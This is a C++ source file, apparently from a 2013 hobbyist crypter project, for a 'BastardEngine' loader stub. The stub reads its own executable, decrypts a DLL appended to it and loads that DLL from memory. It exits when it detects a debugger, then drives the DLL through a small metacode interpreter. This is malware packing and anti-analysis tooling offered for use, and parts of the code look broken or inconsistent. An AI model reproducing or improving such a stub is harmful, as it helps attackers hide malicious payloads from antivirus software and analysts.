/*
	Author: Know v3.0
	Twitter: @KnowV3
	Email: know [dot] omail [dot] pro
	Website: knowlegend.ws / knowlegend.me

	(c) 2013 - Know v3.0 alias Knowlgend
*/
#include "BastardEngine.h"
#include "PolyEngine.h"
#include <iostream>
#include <fstream>
#include <stdio.h>
using namespace std;

BastardEngine *engine;

/** you see here a list of functions that the metacode can call **/

void funcMessageBox(char* title, char* text) {
	ONE(NULL, "yay", "yay", 0);

}

void funcCreateChar() {
	int len = engine->Engine->eax;
	char *arr = (char*)malloc((len*sizeof(char))+1);
	for(int i = 0; i < len; ++i) {
		arr[i] = (char)engine->nextInstr();
		arr[++i] = (char) engine->nextInstr();
	}
	arr[len] = '\0';
	char **ptrptr = &arr;
	int addr;
	__asm {
		mov eax, ptrptr;
		mov ebx, [eax];
		mov addr, ebx;
	
	};
	engine->Engine->eax = addr;
}

/* a pointer to void*(the functions) */
void* funcs[] = { funcCreateChar, funcMessageBox };

/* 
	the metacode can call this 2 functions with the instruction,
	so you can add more functions and then it would be able to call that functions from metacode..

	mov eax, [ebx+4]
	call eax --> calls funcMessageBox
	
	or

	mov eax, [ebx]
	call eax --> calls funcMessageBox

	it works cause we pushs the "funcss"-addr into the virtual ebx register, see BastardEngine-Constructor ;-)
	and the metacode operates only with this list of virtual registers... 

*/
void** funcss = funcs;

/* END  */


BastardEngine::BastardEngine(void)
{
	this->count = -1;
	int addr;
	__asm mov eax, funcss;
	__asm mov addr, eax;

	this->Engine = new _Engine;
	this->Engine->eax = 0;
	this->Engine->ebx = addr;
	this->Engine->ecx = 0;
	this->Engine->edx = 0;
	this->Engine->eex = 0;
	this->Engine->efx = 0;
	this->Engine->egx = 0;

}

BastardEngine::~BastardEngine(void)
{
}

void BastardEngine::getFileContent() {
	/* opens our self and reads our content  */
	char szFileName[MAX_PATH+1];
	char* buffer;
	int length;
	GetModuleFileNameA(NULL, szFileName, MAX_PATH);
	ifstream is;
	is.open (szFileName, ios::binary );
	
	// get length of file:
	is.seekg (0, ios::end);
	length = (int)is.tellg();
	is.seekg (0, ios::beg);

	// allocate memory:
	buffer = new char [length];

	// read data as a block:
	is.read (buffer,length);
	is.close();
  

	this->filesize = length;
	this->data = buffer;
}

void BastardEngine::createInstructions() {
	/*  
		this function puchs every metacode instruction e.g. push eax to a vector
		cause its easier to handle later
	*/
	int count = 0;
	for(size_t i = 0; i < strlen(this->rawcode); ++i) {
		if(this->rawcode[i] == '#') { ++count; }

	}
	this->metacode = new vector<char*>(count);
	char* chars_array = strtok(this->rawcode, "#");
	count = 0;
	while (chars_array != NULL) {
		this->metacode->at(count) = chars_array;
		chars_array = strtok (NULL, "#");
		++count;
	}

}

char* BastardEngine::nextInstr() {
	/*  
		check if count is bigger or equals to the size of metacode if true no more metacode is availabel and return null
		else return the next metacode instruction
	*/
	if(++this->count >= (int)this->metacode->size()) { return NULL; }
	return this->metacode->at(this->count);
}

void BastardEngine::go() {	
	PolyEngine *poly = new PolyEngine();
	/* Get his own content and size (this->data and this->filesize) */
	this->getFileContent();

	/* Reads the size of the appendet DLL, you can find it at the first line near "This__SIZE__Programm cant run in DOS mode"  */
	this->size = PolyEngine::getSize(this->data);

	if(this->size != NULL && !IsDebuggerPresent()) {
		/* Reads the appendet code ( cryptet DLL ) */
		char* dllCode = PolyEngine::getCode(this->data, this->filesize, this->size);
	
		/* decrypts the dll  */
		dllCode = PolyEngine::decryptDLL(dllCode, this->size);
		if(dllCode == NULL) { MessageBoxA(0, "Cant decrypt DLL", "Error", 0); ExitProcess(0);}

		/* Reads the size of the appendet META_CODE, you can find it at the first line near "This__SIZE__Programm cant run in DOS mode"*/
		this->size = PolyEngine::getSize(dllCode);

		/* Reads the appendet META_CODE */
		this->rawcode = PolyEngine::getCode(dllCode, PolyEngine::getSize(this->data), this->size);
	
		/* generate a vector with each META_CODE-instruction */
		this->createInstructions();

		/* loads the DLL from Memory */
		PolyEngine::loadMetaEngineFromMemory(dllCode, this, &BastardEngine::nextInstr);

	} else {
		ExitProcess(0);
	
	}
}

